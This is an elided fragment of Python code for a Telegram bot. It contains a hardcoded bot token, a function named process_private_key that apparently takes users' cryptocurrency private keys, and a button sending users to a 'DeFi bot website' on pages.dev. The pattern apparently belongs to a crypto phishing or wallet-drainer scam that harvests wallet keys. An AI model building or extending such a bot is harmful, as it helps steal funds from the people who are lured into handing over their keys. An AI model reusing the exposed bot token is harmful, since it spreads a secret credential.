...
BOT_TOKEN = '6841347515:AAEKWAVMz-LEAL0h94rTCFbMjzld-4QXWh4'
...
def process_private_key(message):
    ...
    if private_key.lower() == '/continue':
        ...
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://poodlinu-token.pages.dev/')
